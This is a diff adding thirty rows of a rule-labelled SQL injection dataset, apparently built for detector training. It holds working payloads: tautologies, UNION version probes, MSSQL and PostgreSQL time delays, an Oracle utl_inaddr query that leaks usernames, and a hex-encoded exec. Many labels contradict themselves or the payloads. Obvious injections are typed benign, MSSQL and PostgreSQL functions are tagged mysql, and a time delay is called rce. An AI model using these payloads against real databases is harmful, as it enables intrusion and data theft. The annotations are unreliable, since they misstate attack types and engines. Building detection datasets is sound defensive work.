@@ -1,0 +1,31 @@
+row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
+90,1 and user_name ( ) = 'dbo',1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+91,"; if not ( substring ( ( select @@version ) ,24,1 ) <> 1 ) waitfor delay '0:0:2' --",1,,time_blind,mysql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+92,"select * from users where id = 1 or 1#""$ union select 1,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
+93,"select * from users where id = 1 or 1#""{ union select null,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
+94,select * from users where id = '1' *$ . or 1 = 1 -- 1',1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+95,select * from users where id = 1 +$+. or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+96,select * from users where id = 1 or ( \+ ) = 1 or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+97,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 6 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
+98,or 1 = 1 or '' = ',1,,boolean_blind,generic,0.95,"or 1 = 1, 1 = 1 or detected — boolean_blind injection (priority 8) on generic",rule-based
+99,select * from users where id = 1 or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+100,or 'text' > 't',1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+101,"1234 "" AND 1 = 0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1,,union_based,generic,0.95,"UNION ALL SELECT, UNION ALL SELECT detected — union_based injection (priority 7) on generic",rule-based
+102,"select * from users where id = 1 or ""%["" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+103,"select * from users where id = 1 or 1#""; = 1 union select 1,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
+104,admin' or '1' = '1'#,1,,boolean_blind,generic,0.95,or '1' = '1' detected — boolean_blind injection (priority 8) on generic,rule-based
+105,select * from users where id = 1 +$ 1 or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+106,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 4 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
+107,select * from information_schema.tables--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+108,"select * from users where id = 1 or ""$&"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+109,1 ) ) or pg_sleep ( __TIME__ ) --,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
+110,"select * from users where id = '1' union select !<@,version ( ) -- 1'",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
+111,declare @q nvarchar ( 200 ) select @q = 0x770061 ...,1,,union_based,generic,0.95,@q nvarchar ( 200 ) select detected — union_based injection (priority 7) on generic,rule-based
+112,select * from users where id = 1 %!<1 or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+113,declare @q nvarchar ( 200 ) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec ( @q ),1,,rce,generic,0.95,0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 detected — rce injection (priority 1) on generic,rule-based
+114,"select * from users where id = 1 or ""]1"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+115,"select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
+116,or 'unusual' = 'unusual',1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+117,or 1 in ( select @@version ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+118,truncate,1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
+119, or 3 = 3 --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
